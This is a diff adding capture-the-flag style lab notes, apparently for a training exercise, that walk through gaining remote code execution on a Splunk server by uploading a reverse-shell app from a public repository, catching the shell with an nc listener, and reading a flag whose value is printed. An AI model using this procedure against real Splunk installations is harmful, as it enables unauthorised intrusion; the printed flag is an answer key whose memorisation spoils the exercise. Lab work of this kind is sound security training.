@@ -1,1 +1,21 @@
 
+Question 1 - Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory.
+1) navigate to http://10.129.201.58:8000
+2) git clone https://github.com/0xjpuff/reverse_shell_splunk.git
+3) edit the file run.ps1 under the directory reverse_shell_splunk/reverse_shell_splunk/bin to insert PWNIP and PWNPO, in place of 'attacker_ip_here' and attacker_port_here
+4) create a tar ball of the directory so that it can be uploaded to Splunk -> do this from thhe /reverse_shell_splunk directorty 
+5) tar -cvzf updater.tar.gz reverse_shell_splunk/
+
+reverse_shell_splunk/
+reverse_shell_splunk/bin/
+reverse_shell_splunk/bin/rev.py
+reverse_shell_splunk/bin/run.bat
+reverse_shell_splunk/bin/run.ps1
+reverse_shell_splunk/default/
+reverse_shell_splunk/default/inputs.conf
+
+6) set up NC listener 
+7) inside of splunk click on "Manage Apps"
+8) click on "Install app from file" and upload the tar ball file
+9) after tarball is uploaded successfully we will catch shell 
+10) cat C:\loot\flag.txt   l00k_ma_no_AutH!  
